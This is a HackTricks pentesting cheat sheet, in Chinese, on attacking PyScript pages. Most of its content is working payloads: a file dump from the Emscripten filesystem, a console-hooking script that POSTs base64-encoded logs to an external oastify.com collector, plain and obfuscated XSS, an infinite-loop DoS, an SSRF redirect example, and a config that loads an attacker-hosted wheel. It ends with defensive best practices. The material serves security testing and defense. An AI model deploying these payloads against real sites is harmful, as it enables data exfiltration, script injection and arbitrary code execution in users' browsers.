# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting Guide

PyScript 是一个用于将 Python 集成到 HTML 中的新 framework，因此可以与 HTML 一起使用。在这份 cheat sheet 中，你将了解如何将 PyScript 用于 pentesting。

### 从 Emscripten 虚拟内存文件系统中 Dumping / Retrieving 文件：

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
代码：
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
结果：

![PyScript Pentesting Guide - 从 Emscripten 虚拟内存文件系统中转储/检索文件：= fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten 虚拟内存文件系统的 OOB 数据外传（控制台监控）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
代码：
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
结果：

![从 Emscripten 虚拟内存文件系统转储/检索文件 - Emscripten 虚拟内存文件系统的数据外带（控制台监控）：Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting（普通）

代码：
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
结果：

![OOB Data Exfiltration of the Emscripten virtual memory filesystem（console monitoring）- Cross Site Scripting (Ordinary)：Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

代码：
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
结果：

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

代码：
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Result:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

代码:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
结果：

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 新漏洞与技术（2023-2025）

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 < 2.5.0` 在 PyScript 随附的 **Pyodide runtime** 中执行时，会忽略 `redirect` 和 `retries` 参数。当攻击者能够影响目标 URL 时，即使开发者明确禁用了 redirect，他们仍可能强制 Python code 跟随跨域 redirect——从而有效绕过 anti-SSRF logic。<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
已在 `urllib3 2.5.0` 中修复——请升级 PyScript image 中的 package，或在 `packages = ["urllib3>=2.5.0"]` 中固定安全版本。详情请参阅官方 CVE 条目。

### 任意 package 加载与 supply-chain attacks

由于 PyScript 允许在 `packages` 列表中使用任意 URLs，能够修改或注入配置的恶意攻击者可以在受害者的 browser 中执行**完全任意的 Python**：
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*仅需要 pure-Python wheels —— 不需要 WebAssembly compilation step。确保 configuration 不受 user 控制，并在你自己的 domain 上通过 HTTPS 托管 trusted wheels，同时使用 SRI hashes。

### Output sanitisation changes (2023+)

* `print()` 仍会注入 raw HTML，因此存在 XSS 风险（如上例所示）。
* 较新的 `display()` helper 默认会对 HTML 进行 escaping —— 必须将 raw markup 包装在 `pyscript.HTML()` 中。
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
此行为于 2023 年引入，并记录在官方 Built-ins 指南中。对于不受信任的输入，应依赖 `display()`，避免直接调用 `print()`。<sup>[[2]](#references)</sup>

---

## 防御最佳实践

* **保持 packages 为最新版本** – 升级到 `urllib3 >= 2.5.0`，并定期重新构建随站点提供的 wheels。
* **限制 package 来源** – 仅引用 PyPI 名称或同源 URL，最好使用 Sub-resource Integrity (SRI) 进行保护。
* **强化 Content Security Policy** – 禁止 inline JavaScript（`script-src 'self' 'sha256-…'`），使注入的 `<script>` 块无法执行。
* **禁止用户提供 `<py-script>` / `<script type="py">` 标签** – 在服务器端对 HTML 进行清理，然后再将其回显给其他用户。
* **隔离 workers** – 如果不需要从 workers 同步访问 DOM，请启用 `sync_main_only` 标志，以避免 `SharedArrayBuffer` 的 header 要求。

## 参考资料

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript Built-ins 文档 – `display` 与 `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
